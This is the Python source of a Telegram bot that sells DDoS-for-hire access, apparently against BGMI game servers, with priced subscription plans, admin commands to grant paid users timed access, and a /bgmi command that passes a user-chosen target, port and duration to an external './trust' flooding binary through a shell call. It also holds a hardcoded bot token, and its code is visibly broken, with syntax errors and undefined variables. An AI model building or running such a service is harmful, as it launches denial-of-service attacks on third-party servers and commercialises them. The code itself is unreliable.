import telebot
import subprocess
import requests
import datetime
import os
import random
import threading

# Put Your Telegram Bot Token Here
bot = telebot.TeleBot('7487481982:AAHfBWIO_sUDoKtalQXSjATqoLPY_AcsS8U')

# Admin User ID
admin_id = ["7374612242"]

# File To Store Authorised User IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store proxy list
PROXY_FILE = "n.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["7374612242"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝐋𝐨𝐠𝐬 𝐀𝐫𝐞 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐍𝐨 𝐃𝐚𝐭𝐚 𝐅𝐨𝐮𝐧𝐝"
            else:
                file.truncate(0)
                response = "𝐋𝐨𝐠𝐬 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲"
    except FileNotFoundError:
        response = "𝐍𝐨 𝐋𝐨𝐠𝐬 𝐅𝐨𝐮𝐧𝐝 𝐓𝐨 𝐂𝐥𝐞𝐚𝐫"
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")
        
import time

# Global dictionary to store the approval expiry dates for users
user_approval_expiry = {}

# Function to check and remove expired users
def remove_expired_users():
    while True:
        current_time = datetime.datetime.now()
        # Iterate through users' approval expiry dates
        for user_id, expiry_date in list(user_approval_expiry.items()):
            if expiry_date < current_time:
                # Remove the user from the allowed list and update the file
                if user_id in allowed_user_ids:
                    allowed_user_ids.remove(user_id)
                    with open(USER_FILE, "w") as file:
                        for user_id in allowed_user_ids:
                            file.write(f"{user_id}\n")
                    del user_approval_expiry[user_id]  # Remove from the approval expiry dictionary
                    print(f"User {user_id} has been removed due to expired approval.")
        time.sleep(3600)  # Check every hour

# Start the thread to remove expired users
threading.Thread(target=remove_expired_users, daemon=True).start()

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "𝐄𝐱𝐩𝐢𝐫𝐞𝐝"
        else:
            return str(remaining_time)
    else:
        return "𝐍𝐨𝐭 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30*duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐟𝐨𝐫𝐦𝐚𝐭. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐞 𝐢𝐧𝐭𝐞𝐠𝐞𝐫 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐝 𝐛𝐲 '𝐡𝐨𝐮𝐫(𝐬)', '𝐝𝐚𝐲(𝐬)', '𝐰𝐞𝐞𝐤(𝐬)', 𝐨𝐫 '𝐦𝐨𝐧𝐭𝐡(𝐬)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"𝐔𝐬𝐞𝐫 {user_to_add} 𝐀𝐝𝐝𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐅𝐨𝐫 {duration} {time_unit} 𝐀𝐜𝐜𝐞𝐬𝐬 𝐖𝐢𝐥𝐥 𝐄𝐱𝐩𝐢𝐫𝐞 𝐎𝐧 {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐬𝐞𝐭 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐞𝐱𝐩𝐢𝐫𝐲 𝐝𝐚𝐭𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐥𝐚𝐭𝐞𝐫."
            else:
                response = "𝐔𝐬𝐞𝐫 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐄𝐱𝐢𝐬𝐭𝐬"
        else:
            response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐩𝐞𝐜𝐢𝐟𝐲 𝐚 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐚𝐧𝐝 𝐭𝐡𝐞 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 (𝐞.𝐠., 𝟏𝐡𝐨𝐮𝐫, 𝟐𝐝𝐚𝐲𝐬, 𝟑𝐰𝐞𝐞𝐤𝐬) 𝐭𝐨 𝐚𝐝𝐝"
    else:
        response = "ʸᵒᵘ ⁿᵒᵗ ᵖᵘʳᶜʰᵃˢᵉ ᵗʰⁱˢ ᵇᵒᵗ ᵃⁿᵈ ᵒʷⁿᵉʳ ᶜᵃⁿ ᵈᵒ ᵗʰⁱˢ ᵈᵐ @TRUSTVIP_MOD0"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    user_name = user_info.username
    user_first = user_info.first_name
    user_last = user_info.last_name
    user_role = "𝐀𝐝𝐦𝐢𝐧" if user_id in admin_id else "𝐔𝐬𝐞𝐫"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"ℹ️ 👤 You Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐘𝐨𝐮𝐫 𝐢𝐝: {user_id}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝐔𝐬𝐞𝐫 {user_to_remove} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲"
            else:
                response = f"𝐔𝐬𝐞𝐫 {user_to_remove} 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐭𝐡𝐞 𝐥𝐢𝐬𝐭"
        else:
            response = '''𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐔𝐬𝐞𝐫 𝐈𝐃 𝐭𝐨 𝐑𝐞𝐦𝐨𝐯𝐞. 
𝐔𝐬𝐚𝐠𝐞: /remove <𝐮𝐬𝐞𝐫𝐢𝐝>'''
    else:
        response = "ʸᵒᵘ ⁿᵒᵗ ᵖᵘʳᶜʰᵃˢᵉ ᵗʰⁱˢ ᵇᵒᵗ ᵃⁿᵈ ᵒʷⁿᵉʳ ᶜᵃⁿ ᵈᵒ ᵗʰⁱˢ ᵈᵐ @TRUSTVIP_MOD0 🙇."


    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝐋𝐨𝐠𝐬 𝐚𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
                else:
                    file.truncate(0)
                    response = "𝐋𝐨𝐠𝐬 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲"
        except FileNotFoundError:
            response = "𝐋𝐨𝐠𝐬 𝐚𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐥𝐞𝐚𝐫𝐞𝐝"
    else:
        response = ""
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝐔𝐒𝐄𝐑𝐒 𝐚𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
                else:
                    file.truncate(0)
                    response = "𝐮𝐬𝐞𝐫𝐬 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲"
        except FileNotFoundError:
            response = "𝐔𝐬𝐞𝐫𝐬 𝐚𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐜𝐥𝐞𝐚𝐫𝐞𝐝"
    else:
        response = "ʸᵒᵘ ⁿᵒᵗ ᵖᵘʳᶜʰᵃˢᵉ ᵗʰⁱˢ ᵇᵒᵗ ᵃⁿᵈ ᵒʷⁿᵉʳ ᶜᵃⁿ ᵈᵒ ᵗʰⁱˢ ᵈᵐ @TRUSTVIP_MOD0❄."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐔𝐬𝐞𝐫𝐬:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- 𝐔𝐬𝐞𝐫 𝐢𝐝: {user_id}\n"
                else:
                    response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
        except FileNotFoundError:
            response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @TRUSTVIP_MOD0🙇."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
                bot.reply_to(message, response)
        else:
            response = "𝐍𝐨 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝"
            bot.reply_to(message, response)
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @TRUSTVIP_MOD0❄."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /shadow command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    user_name = user_info.first_name
    
     response = f" 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃🔥🔥."
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /shadow command
bgmi_cooldown = {}

COOLDOWN_TIME =60

# Function to read proxies from file
def read_proxies():
    try:
        with open(PROXY_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to get a random proxy
def get_random_proxy():
    proxies = read_proxies()
    if proxies:
        return random.choice(proxies)
    return None

# Global variables for lock and current attack state
attack_lock = threading.Lock()
current_attacker = None
attack_end_time = None

# Function to start an attack
def start_attack(user_id, target, port, duration):
    global current_attacker, attack_end_time
    
    # Check cooldown for /shadow command
    last_used = bgmi_cooldown.get(user_id)
    if last_used and (datetime.datetime.now() - last_used).seconds < COOLDOWN_TIME:
        remaining_cooldown = COOLDOWN_TIME - (datetime.datetime.now() - last_used).seconds
        bot.send_message(
            user_id,
            f"⚠️ Please wait {remaining_cooldown} seconds before issuing another attack command."
        )
        return

    # Check if attack duration exceeds 180 seconds
    if duration > 240:
        bot.send_message(user_id, "❌ Attack duration cannot be more than 240 seconds.")
        return

    if not attack_lock.acquire(blocking=False):  # Check if attack is already running
        if attack_end_time is not None:
            remaining_time = (attack_end_time - datetime.datetime.now()).seconds
            bot.send_message(
                user_id,
                f"⚠️ Attack already in progress by user {current_attacker}. Please wait {remaining_time} seconds."
            )
        else:
            bot.send_message(
                user_id,
                "⚠️ Attack already in progress. Please wait for the current attack to finish."
            )
        return

    try:
        # Set the current attacker and calculate attack end time
        current_attacker = user_id
        attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)

        # Notify the user and start the attack
        bot.send_message(user_id, f" response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐢𝐦𝐞: {time} "
        
        # Execute the bgmi command on VPS
        attack_command = f"./trust {target} {port} {duration} {9} 900"
        subprocess.run(attack_command, shell=True, check=True)
        
        bot.send_message(user_id, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
    except subprocess.CalledProcessError as e:
        bot.send_message(user_id, f"❌ Failed to execute attack: {e}")
    finally:
        # Release the lock after attack completion
        current_attacker = None
        attack_end_time = None
        attack_lock.release()

# Command handler for attack
@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    global current_attacker

    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "𝗖𝗛𝗟 𝗕𝗢𝗢𝗦𝗗𝗜𝗞𝗘 😂 𝗙𝗜𝗥𝗦𝗧 𝗨𝗦𝗘 𝗖𝗢𝗡𝗗𝗢𝗠  𝗕𝗨𝗬 @TRUSTVIP_MOD0")
        return

    # Parse the command
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
        return

    target = command[1]
    port = command[2]
    try:
        duration = int(command[3])
        if duration <= 0:
            raise ValueError
    except ValueError:
        bot.reply_to(message, "❌ Invalid duration. Please provide a positive number.")
        return

    # Start the attack in a separate thread
    threading.Thread(target=start_attack, args=(user_id, target, port, duration)).start()

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "𝐍𝐨 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐋𝐨𝐠𝐬 𝐅𝐨𝐮𝐧𝐝 𝐅𝐨𝐫 𝐘𝐨𝐮"
        except FileNotFoundError:
            response = "𝐍𝐨 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐋𝐨𝐠𝐬 𝐅𝐨𝐮𝐧𝐝"
    else:
        response = "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
🦚 /bgmi : 𝙎𝙀𝙍𝙑𝙀𝙍 𝘼𝙏𝙏𝘼𝘾𝙆. 
🦚 /rules : Please Check Before Use !!.
🦚 /mylogs : To Check Your Recents Attacks.
🦚 /prize : 𝘾𝙃𝙀𝘾𝙆 𝙑𝙄𝙋 𝙊𝙁𝙁𝙀𝙍.
🦚 /myinfo : 𝙏𝙊 𝘾𝙃𝘾𝙆 𝙔𝙊𝙐𝙍 𝘼𝘾𝙊𝙐𝙉𝙏 .

🤖 𝙏𝙊 𝙎𝙀𝙀 𝘼𝙇𝙇 𝘾𝙊𝙊𝙈𝘼𝙉𝘿
🦚 /tutorial : 𝙎𝙃𝙊𝙒 𝙏𝙃𝙀 𝙏𝙐𝙏𝙊𝙍𝙄𝘼𝙇--𝙨𝙚𝙩𝙪𝙥--.
🦚 /admincmd : Shows All Admin Commands.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
🦚𝙏𝙍𝙔 𝙏𝙃𝙄𝙎 𝘾𝙊𝙊𝙈𝙈𝘼𝙉𝘿: /help 
🥶𝘽𝙐𝙔 :- @TRUSTVIP_MOD0'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐏𝐥𝐞𝐚𝐬𝐞 𝐅𝐨𝐥𝐥𝐨𝐰 𝐓𝐡𝐞𝐬𝐞 𝐑𝐮𝐥𝐞𝐬 🚦:
1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['prize'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

🍑𝗩𝗜𝗣 𝗡𝗨𝗗𝗘𝗦 𝗣𝗥𝗜𝗖𝗘🍑

𝗔𝗔𝗧𝗖𝗞 𝗧𝗜𝗠𝗘   300𝘀
𝗞𝗜𝗟𝗟𝗦 𝗟𝗜𝗠𝗜𝗧    50𝗺𝗶𝗻𝗶𝗺𝘂𝗺
𝗥𝗔𝗡𝗞 𝗣𝗟𝗨𝗦    80»100 

𝗜乛 𝗧𝗥𝗨𝗦𝗧 𝗢𝗪𝗡𝗘𝗥 𓆩☠️𓆪, 𝐖𝐞 𝐇𝐚𝐯𝐞 𝐎𝐧𝐥𝐲 𝟏 𝐏𝐥𝐚𝐧 𝐀𝐧𝐝 𝐓𝐡𝐚𝐭 𝐈𝐬 𝐏𝐨𝐰𝐞𝐫𝐟𝐮𝐥𝐥 𝐓𝐡𝐞𝐧 𝐀𝐧𝐲 𝐎𝐭𝐡𝐞𝐫 𝐃𝐃𝐨𝐒 𝐓𝐡𝐚𝐭 𝐈𝐬 #TRUSTVIPDDOS  !!!:


-> 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞 : 𝟏8𝟎 (𝐒)
> 𝐀𝐟𝐭𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐋𝐢𝐦𝐢𝐭 : 𝟎 𝐬𝐞𝐜
-> 𝐂𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭𝐬 𝐀𝐭𝐭𝐚𝐜𝐤 : 𝟓𝟎𝟎

༆༆༆༆༆༆༆༆༆༆༆༆༆༆༆༆༆

⭕️ DDOS BOT 24×7 ONLINE 

♨️1 WEEK 250 RS

♨️1 MONTH 400 RS

♨️FULL SEASON 600 RS

♨️ YOUR OWN DDOS BOT 1.2𝗸 RS DISCOUNT AVAILABLE 

DM :- @TRUSTVIP_MOD0

'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admin'])
def welcome_admin(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐀𝐫𝐞 𝐇𝐞𝐫𝐞!!:
    
🦅 /add <userId> : Add a User.
🦅 /remove <userid> Remove a User.
🦅 /allusers : Authorised Users Lists.
🦅 /logs : All Users Logs.
🦅 /broadcast : Broadcast a Message.
🦅 /clearlogs : Clear The Logs File.
🦅 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐓𝐨 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬 𝐁𝐲 𝐀𝐝𝐦𝐢𝐧:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐛𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐮𝐬𝐞𝐫 {user_id}: {str(e)}")
            response = "𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐒𝐞𝐧𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐓𝐨 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬"
        else:
            response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐀 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐓𝐨 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭."
    else:
        response = "𝐎𝐧𝐥𝐲 𝐀𝐝𝐦𝐢𝐧 𝐂𝐚𝐧 𝐑𝐮𝐧 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['tutorial'])
def welcome_tutorial(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐇𝐨𝐰 𝐓𝐨 𝐔𝐬𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 :

🥶 /video : 𝙃𝙊𝙒 𝙏𝙊 𝘼𝙏𝙏𝘾𝙆
🥶 /httpcanary : 𝘾𝘼𝙉𝘼𝙍𝙔 𝘼𝙋𝙆.
'''

    bot.reply_to(message, response)

@bot.message_handler(commands=['httpcanary'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}                                                          ᑕᗩᑎᑎᖇY ᗩᑭᑭᒪIᑕᗩTIOᑎ                            :\nhttps://t.me/TRUSTFEDDBACK/1543'''
    
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['video'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}                                                             ᕼOᗯ TO ᗩTTᑕK ᐯIᗪᗴO                               :\nhttps://t.me/TRUSTFEDDBACK/585'''
    
    bot.reply_to(message, response)

#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


